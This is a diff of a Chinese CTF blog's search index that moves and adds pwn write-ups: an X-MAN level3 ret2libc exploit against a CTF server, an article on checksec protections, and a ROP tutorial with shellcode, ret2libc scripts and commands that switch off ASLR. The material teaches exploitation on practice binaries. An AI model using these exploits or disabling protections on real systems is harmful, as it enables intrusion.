@@ -100,6 +100,55 @@ p.interactive()
       </tags>
   </entry>
   <entry>
+    <title>X-MAN-level3</title>
+    <url>/2017/02/24/X-MAN-level3/</url>
+    <content><![CDATA[<p>本题主要考察通过延迟绑定技术泄漏函数的真实地址，<a href="http://yunnigu.dropsec.xyz/2017/02/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/">延迟绑定技术</a>,通过GDB调试会发现程序开启了NX保护。而且也找不到system函数和bin/sh，<br><a id="more"></a><br>首先需要泄漏write函数的地址用来求出system和bin/sh的实际地址，构造payload=‘A’*140+p32(writeplt) +p32(vuladdr)+ p32(1) + p32(writegot) + p32(4)<br>返回地址改为溢出发现的函数地址是为了接下来第二个payload的构造，因为函数每次运行的个函数的实际地址是不同的。后面的三个是write函数的三个参数，通过延迟绑定原理将write的实际地址写出来。</p>
+<p>第二个payload就是直接修改返回地址为system真实地址再加上bin/sh的地址就可以实现利用。脚本如下：</p>
+<pre><code>from pwn import *
+
+#p=process(&apos;./level3&apos;)
+#libc=ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)
+#context.log_level = &apos;debug&apos;
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9879)
+
+level2=ELF(&apos;./level3&apos;)
+libc=ELF(&apos;libc-2.19.so&apos;)
+#offest
+writeoffest = libc.symbols[&apos;write&apos;]
+print writeoffest
+systemoffest = libc.symbols[&apos;system&apos;]
+print systemoffest
+binshoffest=0x0016084C
+#plt
+writeplt=0x08048340
+#got
+writegot=0x0804A018
+#addr
+basebss = 0x0804A024
+pop3ret = 0x08048519
+vuladdr = 0x0804844B
+
+payload=&apos;A&apos;*140+p32(writeplt) +p32(vuladdr)+ p32(1) + p32(writegot) + p32(4)
+
+p.recvuntil(&apos;Input:\n&apos;)
+p.send(payload)
+writeaddr=u32(p.recv(4))
+print writeaddr
+
+systemaddr = writeaddr - writeoffest + systemoffest
+binshaddr = writeaddr - writeoffest + binshoffest
+
+payload=&apos;a&apos;*140+p32(systemaddr)+p32(4)+p32(binshaddr)
+
+p.send(payload)
+p.interactive()
+</code></pre>]]></content>
+      <tags>
+        <tag>ctf</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XMAN-Level3-x64</title>
     <url>/2017/02/27/XMAN-Level3-x64/</url>
     <content><![CDATA[<p>这个题目和XMAN-Level2-x64考察目的是一样的，都是考察在x64中传参数的问题，这个题目是如何考察在x64中传多个参数。<br><a id="more"></a></p>
@@ -153,55 +202,6 @@ sh.interactive()
       </tags>
   </entry>
   <entry>
-    <title>X-MAN-level3</title>
-    <url>/2017/02/24/X-MAN-level3/</url>
-    <content><![CDATA[<p>本题主要考察通过延迟绑定技术泄漏函数的真实地址，<a href="http://yunnigu.dropsec.xyz/2017/02/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/">延迟绑定技术</a>,通过GDB调试会发现程序开启了NX保护。而且也找不到system函数和bin/sh，<br><a id="more"></a><br>首先需要泄漏write函数的地址用来求出system和bin/sh的实际地址，构造payload=‘A’*140+p32(writeplt) +p32(vuladdr)+ p32(1) + p32(writegot) + p32(4)<br>返回地址改为溢出发现的函数地址是为了接下来第二个payload的构造，因为函数每次运行的个函数的实际地址是不同的。后面的三个是write函数的三个参数，通过延迟绑定原理将write的实际地址写出来。</p>
-<p>第二个payload就是直接修改返回地址为system真实地址再加上bin/sh的地址就可以实现利用。脚本如下：</p>
-<pre><code>from pwn import *
-
-#p=process(&apos;./level3&apos;)
-#libc=ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)
-#context.log_level = &apos;debug&apos;
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9879)
-
-level2=ELF(&apos;./level3&apos;)
-libc=ELF(&apos;libc-2.19.so&apos;)
-#offest
-writeoffest = libc.symbols[&apos;write&apos;]
-print writeoffest
-systemoffest = libc.symbols[&apos;system&apos;]
-print systemoffest
-binshoffest=0x0016084C
-#plt
-writeplt=0x08048340
-#got
-writegot=0x0804A018
-#addr
-basebss = 0x0804A024
-pop3ret = 0x08048519
-vuladdr = 0x0804844B
-
-payload=&apos;A&apos;*140+p32(writeplt) +p32(vuladdr)+ p32(1) + p32(writegot) + p32(4)
-
-p.recvuntil(&apos;Input:\n&apos;)
-p.send(payload)
-writeaddr=u32(p.recv(4))
-print writeaddr
-
-systemaddr = writeaddr - writeoffest + systemoffest
-binshaddr = writeaddr - writeoffest + binshoffest
-
-payload=&apos;a&apos;*140+p32(systemaddr)+p32(4)+p32(binshaddr)
-
-p.send(payload)
-p.interactive()
-</code></pre>]]></content>
-      <tags>
-        <tag>ctf</tag>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>XMAN-level4</title>
     <url>/2017/02/28/XMAN-level4/</url>
     <content><![CDATA[<p>本题其实就是level3的一个升级版本，唯一的区别就是本题没有提供libc，可以通过DynELF泄漏函数真实地址。<br><a id="more"></a><br>有一个地方需要注意，leak函数可以在write之后直接pop三个参数再返回main：</p>
@@ -246,92 +246,6 @@ p.interactive()
       <tags>
         <tag>ctf</tag>
         <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>checksec及其包含的保护机制</title>
-    <url>/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
-    <content><![CDATA[<p>今天在研究liunx下栈溢出的时候发现自己对各种保护机制并不是特别了解，因此就这方面的知识在网上查找了一些资料并总结了一些心得和大家分享。<br><a id="more"></a><br>操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险，包括DEP、ASLR等。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了DEP（Linux下对应NX）、ASLR（Linux下对应PIE）等机制，例如存在DEP（NX）的话就不能直接执行栈上的数据，存在ASLR的话各个系统调用的地址就是随机化的。</p>
-<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p>checksec是一个脚本软件，也就是用脚本写的一个文件，不到2000行，可用来学习shell。 </p>
-<p>源码参见 </p>
-<p><a href="http://www.trapkit.de/tools/checksec.html" target="_blank" rel="external">http://www.trapkit.de/tools/checksec.html</a></p>
-<p><a href="https://github.com/slimm609/checksec.sh/" target="_blank" rel="external">https://github.com/slimm609/checksec.sh/</a></p>
-<p>下载方法之一为 </p>
-<p>wget <a href="https://github.com/slimm609/checksec.sh/archive/1.6.tar.gz" target="_blank" rel="external">https://github.com/slimm609/checksec.sh/archive/1.6.tar.gz</a></p>
-<p>checksec到底是用来干什么的？ </p>
-<p>它是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。</p>
-<p>checksec的使用方法：<br><img src="http://img.blog.csdn.net/20160920223340302" alt=""></p>
-<p>checksec –file /usr/sbin/sshd<br><img src="http://img.blog.csdn.net/20160920235408000" alt=""></p>
-<p>一般来说，如果是学习二进制漏洞利用的朋友，建议大家使用gdb里peda插件里自带的checksec功能，如下：</p>
-<pre><code>gdb-peda$ checksec start
-CANARY    : disabled
-FORTIFY   : disabled
-NX        : ENABLED
-PIE       : disabled
-RELRO     : disabled
-</code></pre><p>下面我们就图中各个保护机制进行一个大致的了解。</p>
-<h2 id="CANNARY-栈保护"><a href="#CANNARY-栈保护" class="headerlink" title="CANNARY(栈保护)"></a>CANNARY(栈保护)</h2><p>这个选项表示栈保护功能有没有开启。</p>
-<p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
-<p>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。</p>
-<p>因此在编译时可以控制是否开启栈保护以及程度，例如：</p>
-<pre><code>gcc -fno-stack-protector -o test test.c  //禁用栈保护
-gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码
-gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码
-</code></pre><h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>这个保护机制查了很久都没有个很好的汉语形容，根据我的理解它其实和栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。由于并不是太常见，也没有太多的了解。</p>
-<p>举个例子可能简单明了一些：<br>一段简单的存在缓冲区溢出的C代码</p>
-<pre><code>void fun(char *s) {
-        char buf[0x100];
-        strcpy(buf, s);
-        /* Don&apos;t allow gcc to optimise away the buf */
-        asm volatile(&quot;&quot; :: &quot;m&quot; (buf));
-}
-</code></pre><p>用包含参数-U_FORTIFY_SOURCE编译</p>
-<pre><code>08048450 &lt;fun&gt;:
-  push   %ebp               ; 
-  mov    %esp,%ebp
-
-  sub    $0x118,%esp        ; 将0x118存储到栈上
-  mov    0x8(%ebp),%eax     ; 将目标参数载入eax
-  mov    %eax,0x4(%esp)     ; 保存目标参数
-  lea    -0x108(%ebp),%eax  ; 数组buf
-  mov    %eax,(%esp)        ; 保存
-  call   8048320 &lt;strcpy@plt&gt;
-
-  leave                     ; 
-  ret
-</code></pre><p>用包含参数-D_FORTIFY_SOURCE=2编译</p>
-<pre><code>08048470 &lt;fun&gt;:
-  push   %ebp               ; 
-  mov    %esp,%ebp
-
-  sub    $0x118,%esp        ; 
-  movl   $0x100,0x8(%esp)   ; 把0x100当作目标参数保存
-  mov    0x8(%ebp),%eax     ; 
-  mov    %eax,0x4(%esp)     ; 
-  lea    -0x108(%ebp),%eax  ; 
-  mov    %eax,(%esp)        ; 
-  call   8048370 &lt;__strcpy_chk@plt&gt;
-
-  leave                      ; 
-  ret
-</code></pre><p>我们可以看到gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。</p>
-<h2 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h2><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
-<p>工作原理如图：<br><img src="http://space.itpub.net/attachments/2011/07/13164110_201107181702402.jpg?_=2109736" alt=""><br>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。<br>例如：</p>
-<pre><code>gcc -z execstack -o test test.c
-</code></pre><p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p>
-<h2 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h2><p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。</p>
-<p>内存地址随机化机制（address space layout randomization)，有以下三种情况</p>
-<pre><code>0 - 表示关闭进程地址空间随机化。
-1 - 表示将mmap的基址，stack和vdso页面随机化。
-2 - 表示在1的基础上增加栈（heap）的随机化。
-</code></pre><p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p>
-<p>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p>
-<p>liunx下关闭PIE的命令如下：</p>
-<pre><code>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space
-</code></pre><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。</p>
-]]></content>
-      <tags>
-        <tag>liunx</tag>
       </tags>
   </entry>
   <entry>
@@ -429,6 +343,92 @@ memset(TEST,0,sizeof(struct sample_struct)*10);
       <tags>
         <tag>函数</tag>
         <tag>IDA</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>checksec及其包含的保护机制</title>
+    <url>/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
+    <content><![CDATA[<p>今天在研究liunx下栈溢出的时候发现自己对各种保护机制并不是特别了解，因此就这方面的知识在网上查找了一些资料并总结了一些心得和大家分享。<br><a id="more"></a><br>操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险，包括DEP、ASLR等。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了DEP（Linux下对应NX）、ASLR（Linux下对应PIE）等机制，例如存在DEP（NX）的话就不能直接执行栈上的数据，存在ASLR的话各个系统调用的地址就是随机化的。</p>
+<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p>checksec是一个脚本软件，也就是用脚本写的一个文件，不到2000行，可用来学习shell。 </p>
+<p>源码参见 </p>
+<p><a href="http://www.trapkit.de/tools/checksec.html" target="_blank" rel="external">http://www.trapkit.de/tools/checksec.html</a></p>
+<p><a href="https://github.com/slimm609/checksec.sh/" target="_blank" rel="external">https://github.com/slimm609/checksec.sh/</a></p>
+<p>下载方法之一为 </p>
+<p>wget <a href="https://github.com/slimm609/checksec.sh/archive/1.6.tar.gz" target="_blank" rel="external">https://github.com/slimm609/checksec.sh/archive/1.6.tar.gz</a></p>
+<p>checksec到底是用来干什么的？ </p>
+<p>它是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。</p>
+<p>checksec的使用方法：<br><img src="http://img.blog.csdn.net/20160920223340302" alt=""></p>
+<p>checksec –file /usr/sbin/sshd<br><img src="http://img.blog.csdn.net/20160920235408000" alt=""></p>
+<p>一般来说，如果是学习二进制漏洞利用的朋友，建议大家使用gdb里peda插件里自带的checksec功能，如下：</p>
+<pre><code>gdb-peda$ checksec start
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : disabled
+</code></pre><p>下面我们就图中各个保护机制进行一个大致的了解。</p>
+<h2 id="CANNARY-栈保护"><a href="#CANNARY-栈保护" class="headerlink" title="CANNARY(栈保护)"></a>CANNARY(栈保护)</h2><p>这个选项表示栈保护功能有没有开启。</p>
+<p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
+<p>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。</p>
+<p>因此在编译时可以控制是否开启栈保护以及程度，例如：</p>
+<pre><code>gcc -fno-stack-protector -o test test.c  //禁用栈保护
+gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码
+gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码
+</code></pre><h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>这个保护机制查了很久都没有个很好的汉语形容，根据我的理解它其实和栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。由于并不是太常见，也没有太多的了解。</p>
+<p>举个例子可能简单明了一些：<br>一段简单的存在缓冲区溢出的C代码</p>
+<pre><code>void fun(char *s) {
+        char buf[0x100];
+        strcpy(buf, s);
+        /* Don&apos;t allow gcc to optimise away the buf */
+        asm volatile(&quot;&quot; :: &quot;m&quot; (buf));
+}
+</code></pre><p>用包含参数-U_FORTIFY_SOURCE编译</p>
+<pre><code>08048450 &lt;fun&gt;:
+  push   %ebp               ; 
+  mov    %esp,%ebp
+
+  sub    $0x118,%esp        ; 将0x118存储到栈上
+  mov    0x8(%ebp),%eax     ; 将目标参数载入eax
+  mov    %eax,0x4(%esp)     ; 保存目标参数
+  lea    -0x108(%ebp),%eax  ; 数组buf
+  mov    %eax,(%esp)        ; 保存
+  call   8048320 &lt;strcpy@plt&gt;
+
+  leave                     ; 
+  ret
+</code></pre><p>用包含参数-D_FORTIFY_SOURCE=2编译</p>
+<pre><code>08048470 &lt;fun&gt;:
+  push   %ebp               ; 
+  mov    %esp,%ebp
+
+  sub    $0x118,%esp        ; 
+  movl   $0x100,0x8(%esp)   ; 把0x100当作目标参数保存
+  mov    0x8(%ebp),%eax     ; 
+  mov    %eax,0x4(%esp)     ; 
+  lea    -0x108(%ebp),%eax  ; 
+  mov    %eax,(%esp)        ; 
+  call   8048370 &lt;__strcpy_chk@plt&gt;
+
+  leave                      ; 
+  ret
+</code></pre><p>我们可以看到gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。</p>
+<h2 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h2><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
+<p>工作原理如图：<br><img src="http://space.itpub.net/attachments/2011/07/13164110_201107181702402.jpg?_=2109736" alt=""><br>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。<br>例如：</p>
+<pre><code>gcc -z execstack -o test test.c
+</code></pre><p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p>
+<h2 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h2><p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。</p>
+<p>内存地址随机化机制（address space layout randomization)，有以下三种情况</p>
+<pre><code>0 - 表示关闭进程地址空间随机化。
+1 - 表示将mmap的基址，stack和vdso页面随机化。
+2 - 表示在1的基础上增加栈（heap）的随机化。
+</code></pre><p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p>
+<p>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p>
+<p>liunx下关闭PIE的命令如下：</p>
+<pre><code>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space
+</code></pre><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。</p>
+]]></content>
+      <tags>
+        <tag>liunx</tag>
       </tags>
   </entry>
   <entry>
@@ -731,6 +731,171 @@ r.interactive()
 </code></pre>]]></content>
       <tags>
         <tag>writeup</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwn学习rop之x86篇</title>
+    <url>/2016/11/19/pwn%E5%AD%A6%E4%B9%A0rop%E4%B9%8Bx86%E7%AF%87/</url>
+    <content><![CDATA[<p>这段时间自学了蒸米大神写的一步一步学rop系列，以下都是我的学习心得。。。<br><a id="more"></a></p>
+<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>在说ROP之前，先来说一下什么是缓冲区溢出漏洞。缓冲区溢出漏洞（buffer overflow）是当今软件系统最主要的安全漏洞，利用缓冲区溢出漏洞的攻击也是攻击者最常用的攻击方式之一。所谓缓冲区溢出，是指在应用程序或者系统程序的内存中写入超长数据，从而达到恶意改变或者控制程序执行流程的目的。攻击者通过缓冲区溢出把shellcode写入程序的内存空间，并且通过覆盖栈上函数的返回地址，即EIP寄存器所指向的内存地址的值，或者覆盖SEH链表来实现程序执行流程的控制，使得植入内存的shellcode得以执行。</p>
+<p>栈溢出（stack-based buffer overflows）算是安全界常见的漏洞。一方面因为程序员的疏忽，使用了 strcpy、sprintf等不安全的函数，增加了栈溢出漏洞的可能。另一方面，因为栈上保存了函数的返回地址等信息，因此如果攻击者能任意覆盖栈上的数据，通常情况下就意味着他能修改程序的执行流程，从而造成更大的破坏。</p>
+<p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。</p>
+<p>所谓ROP，简单的说就是把原来已经存在的代码块拼接起来，拼接的方式是通过一个预先准备好的特殊的返回栈，里面包含了各条指令结束后下一条指令的地址。</p>
+<p>在一般程序里面，都包含着大量的返回指令（ret），他们基本位于函数的尾部，或是函数中部需要返回的地方。而从函数开始的地方到ret指令之间的这一段序列称为二进制指令代码块（gadgets）。这些二进制指令序列使其组合成完成一些诸如读写内存、算术逻辑运算、控制流程跳转、函数调用等操作。于是，我们就可以通过利用内存空间中各个gadgets以某种顺序执行，达到进行任意操作的目的。而为了使各个gadgets“拼接”起来，我们就需要构造一个特殊的返回栈。首先让指向我们构造的栈（stack）的指针跳到gadget A中，执行其中的代码序列后ret回我们的stack中，然后下一步是跳到gadget B，执行后就到gadgets C……只要stack足够大，就能达到我们想要的效果。</p>
+<h2 id="Control-Flow-Hijack-程序流劫持"><a href="#Control-Flow-Hijack-程序流劫持" class="headerlink" title="Control Flow Hijack 程序流劫持"></a>Control Flow Hijack 程序流劫持</h2><p>比较常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出了。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。（详细了解可以去看我的另一篇博客<a href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">checksec及其包含的保护机制</a>）我们这些初学的菜鸟先一步一步来，之后再加上各种防御措施，接着再学习绕过方法，所谓循序渐进嘛。。。</p>
+<p>首先来看看我们要用的简单的缓冲区溢出例子：</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+void vulnerable_function() {
+    char buf[128];
+    read(STDIN_FILENO, buf, 256);
+}
+
+int main(int argc, char** argv) {
+    vulnerable_function();
+    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);
+}
+</code></pre><p>注意这个例子需要在32位的liunx系统下编译，学64位的时候在64位系统下编译。我们使用如下命令编译它：</p>
+<pre><code>gcc -fno-stack-protector -z execstack -o test1 test.    
+</code></pre><p>这个命令编译程序。-fno-stack-protector和-z execstack这两个参数会分别关掉DEP和Stack Protector。同时我们在shell中执行：</p>
+<pre><code>sudo -s 
+echo 0 &gt; /proc/sys/kernel/randomize_va_space
+exit
+</code></pre><p>这几个指令。执行完后我们就关掉整个linux系统的ASLR保护。</p>
+<p>接下来我们开始对目标程序进行分析。首先我们先来确定溢出点的位置，这里我推荐使用gdb插件peda自带的pattern这个脚本来进行计算。我们使用如下命令：</p>
+<p><img src="http://p1.bqimg.com/567571/4e8b1d7f01ef6a38.png" alt=""></p>
+<p>之后使用gdb调试</p>
+<p><img src="http://p1.bqimg.com/567571/5134a5b537aa2d73.png" alt=""><br>这里我们可以得到内存出错地址为0x41416d41.之后使用命令：</p>
+<p><img src="http://p1.bpimg.com/567571/fadaebd3da23a2e0.png" alt=""></p>
+<p>就可以非常容易的计算出PC返回值的覆盖点为140个字节。我们只要构造一个”A”*140+ret字符串，就可以让pc执行ret地址上的代码了。</p>
+<p>之后就是生成一段shellcode可以在网上找现成的，也可以使用msf生成。作为一个初学者，shellcode的地址并不好找，因为gdb调试的时候会影响buf在内存中的地址，蒸米大神推介了一个好的方法：</p>
+<p>开去core dump 这个功能。</p>
+<pre><code>ulimit -c unlimited
+sudo sh -c &apos;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&apos;
+</code></pre><p>开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。</p>
+<p><img src="http://p1.bqimg.com/567571/dc30b05d3c9ad4ba.png" alt=""></p>
+<p>因为溢出点是140个字节，再加上4个字节的ret地址，我们可以计算出buffer的地址为$esp-144。通过gdb的命令 “x/10s $esp-144”，我们可以得到buf的地址为0xfff66bfd。</p>
+<p>OK，现在溢出点，shellcode和返回值地址都有了，可以开始写exp了。</p>
+<p>最终本地测试代码如下：</p>
+<pre><code>#!python
+#!/usr/bin/env python
+from pwn import *
+
+p = process(&apos;./test&apos;) 
+ret =0xfff66bfd 
+
+shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;
+shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;
+shellcode += &quot;\x0b\xcd\x80&quot;
+
+# p32(ret) == struct.pack(&quot;&lt;I&quot;,ret) 
+#对ret进行编码，将地址转换成内存中的二进制存储形式
+payload = shellcode + &apos;A&apos; * (140 - len(shellcode)) + p32(ret)
+
+p.send(payload) #发送payload
+
+p.interactive()  #开启交互shell
+</code></pre><p>接下来我们把这个目标程序作为一个服务绑定到服务器的某个端口上，这里我们可以使用socat这个工具来完成，命令如下：</p>
+<pre><code>socat TCP4-LISTEN:10001,fork EXEC:./level1
+</code></pre><p>随后这个程序的IO就被重定向到10001这个端口上了，并且可以使用 nc 127.0.0.1 10001来访问我们的目标程序服务了。</p>
+<p>因为现在目标程序是跑在socat的环境中，exp脚本除了要把p = process(‘./level1’)换成p = remote(‘127.0.0.1’,10001) 之外，ret的地址还会发生改变。解决方法还是采用生成core dump的方案，然后用gdb调试core文件获取返回地址。然后我们就可以使用exp进行远程溢出啦！</p>
+<h2 id="0x02-Ret2libc-–-Bypass-DEP-通过ret2libc绕过DEP防护"><a href="#0x02-Ret2libc-–-Bypass-DEP-通过ret2libc绕过DEP防护" class="headerlink" title="0x02 Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护"></a>0x02 Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护</h2><p>现在我们把DEP打开，依然关闭stack protector和ASLR。编译方法如下：</p>
+<pre><code>gcc -fno-stack-protector -o test2 test.c
+</code></pre><p>我们知道test2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。</p>
+<pre><code>$ gdb ./test2
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+….
+(gdb) break main
+Breakpoint 1 at 0x8048430
+(gdb) run
+Starting program: /home/mzheng/CTF/groupstudy/test/test2 
+
+Breakpoint 1, 0x08048430 in main ()
+(gdb) print system
+$1 = {&lt;text variable, no debug info&gt;} 0xb7e5f460 &lt;system&gt;
+(gdb) print __libc_start_main
+$2 = {&lt;text variable, no debug info&gt;} 0xb7e393f0 &lt;__libc_start_main&gt;
+(gdb) find 0xb7e393f0, +2200000, &quot;/bin/sh&quot;(gdb如果安装有peda插件貌似这跳命令找不到)
+0xb7f81ff8
+warning: Unable to access target memory at 0xb7fc8500, halting search.
+1 pattern found.
+(gdb) x/s 0xb7f81ff8
+0xb7f81ff8:  &quot;/bin/sh&quot;
+</code></pre><p>我们首先在main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中，然后我们就可以通过”print system”这个命令来获取system函数在内存中的位置，随后我们可以通过” print __libc_start_main”这个命令来获取libc.so在内存中的起始位置，接下来我们可以通过find命令来查找”/bin/sh”这个字符串。这样我们就得到了system的地址0xb7e5f460以及”/bin/sh”的地址0xb7f81ff8。下面我们开始写exp：</p>
+<pre><code>#!python
+#!/usr/bin/env python
+from pwn import *
+
+p = process(&apos;./level2&apos;)
+#p = remote(&apos;127.0.0.1&apos;,10002)
+
+ret = 0xdeadbeef
+systemaddr=0xb7e5f460
+binshaddr=0xb7f81ff8
+
+payload =  &apos;A&apos;*140 + p32(systemaddr) + p32(ret) + p32(binshaddr)
+
+p.send(payload)
+
+p.interactive()
+</code></pre><h2 id="ROP–-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护"><a href="#ROP–-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护" class="headerlink" title="ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护"></a>ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护</h2><p>接下来我们打开ASLR保护。</p>
+<pre><code>sudo -s 
+echo 2 &gt; /proc/sys/kernel/randomize_va_space
+</code></pre><p>从现在开始会发现test的libc.so的地址每次都会变化。</p>
